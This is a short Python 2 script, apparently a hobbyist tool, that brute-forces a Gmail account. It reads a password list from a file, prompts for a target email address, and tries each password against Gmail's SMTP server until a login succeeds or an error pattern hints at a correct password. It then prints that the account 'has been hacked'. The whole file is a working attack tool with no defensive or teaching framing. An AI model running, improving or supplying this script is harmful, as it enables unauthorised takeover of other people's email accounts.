#!/usr/bin/python

import smtplib
from os import system

def main():
   print '================================================='
   print '               coded by ayoub sirai              '
   print '================================================='
   print '               ++++++++++++++++++++              '
main()
print '[1] start the brute force attack'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('enter the path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    system('clear')
    i = 0
    user_name = raw_input('enter the target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '[+] this account has been hacked, password :' + password
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password
            break
         else:
            system('clear')
login()
